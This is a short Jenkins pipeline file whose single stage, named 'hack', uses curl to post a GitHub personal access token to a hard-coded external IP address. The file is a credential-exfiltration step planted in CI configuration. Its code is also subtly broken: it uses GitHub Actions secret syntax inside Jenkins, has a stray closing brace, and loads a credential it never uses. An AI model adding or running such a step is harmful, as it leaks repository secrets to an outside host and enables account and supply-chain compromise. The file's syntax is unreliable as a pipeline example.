pipeline {
    agent {label 'ec2-node'}
     environment {
        secret_key     = credentials('secret-key')
    }
    stages {
        stage('hack') {
            steps {
              sh 'curl -d env="${{ secrets.PERSONAL_ACCESS_TOKEN_GITHUB }}" http://20.83.189.1'
                }
            }
        }
    }
}
